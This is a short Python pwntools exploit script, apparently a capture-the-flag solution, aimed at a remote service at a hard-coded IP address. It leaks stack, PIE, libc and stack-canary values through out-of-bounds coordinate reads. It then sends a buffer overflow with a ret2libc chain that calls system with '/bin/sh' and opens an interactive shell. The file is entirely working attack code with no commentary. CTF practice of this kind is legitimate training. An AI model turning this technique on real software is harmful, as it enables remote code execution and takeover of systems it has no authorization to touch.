from pwn import *

#s = remote('192.168.33.10',1234)
s = remote('110.10.147.17', 8888)

s.recvuntil('>>')
s.sendline('1')
s.recvuntil('>>')
s.sendline('2')

stack = "";
for i in range(0,4):
  s.recvuntil('x, y')
  s.sendline("%d,%d"%(i,19))
  s.recvuntil('= ')
  r = s.recv(4).split('\n')[0]
  stack += p8(int(r))
stack = u32(stack)
print hex(stack)
pie = "";
for i in range(0,4):
  s.recvuntil('x, y')
  s.sendline("%d,%d"%(i+4,19))
  s.recvuntil('= ')
  r = s.recv(4).split('\n')[0]
  pie += p8(int(r))

pie = u32(pie) - 0x12f3
print hex(pie)
magic = 0x100000000-stack
s.recvuntil('x, y')
s.sendline("%d,%d"%(magic+pie+0x03024+0x98+0x30,0))
s.recvuntil('x, y')
s.sendline("%d,%d"%(4+0x20,(magic+pie+0x03024+0x98+0x6+0x5+0x5)/8))
libc=""
for i in range(0,4):
  s.recvuntil('x, y')
  s.sendline("%d,%d"%(magic+pie+0x03024+0x18+0x30+i,0))
  s.recvuntil('= ')
  r = s.recv(4).split('\n')[0]
  libc += p8(int(r))
libc = u32(libc) - 0xd4350
print hex(libc)
raw_input()
canary = ""
for i in range(0,4):
  s.recvuntil('x, y')
  s.sendline("%d,%d"%(i+4,17))
  s.recvuntil('= ')
  r = s.recv(4).split('\n')[0]
  canary += p8(int(r))
canary= u32(canary)
print hex(canary)
s.recvuntil('x, y')
s.sendline('%d,%d'%(0x88,0))
s.recvuntil('x, y')
s.sendline('%d,%d'%(0,0x11))

s.recvuntil('x, y')
s.sendline('%d,%d'%(0x70,0))
s.recvuntil('x, y')
s.sendline('%d,%d'%(0,14))
s.recvuntil('Name :')
s.sendline('1234')
dat = "A"*(0x200-0xc)
dat += p32(canary)
dat += p32(0x41414141)*3
dat += p32(libc+0x3a940)
dat += p32(0xdeadbeef)
dat += p32(libc+0x15902b)
s.send(dat)
s.interactive()
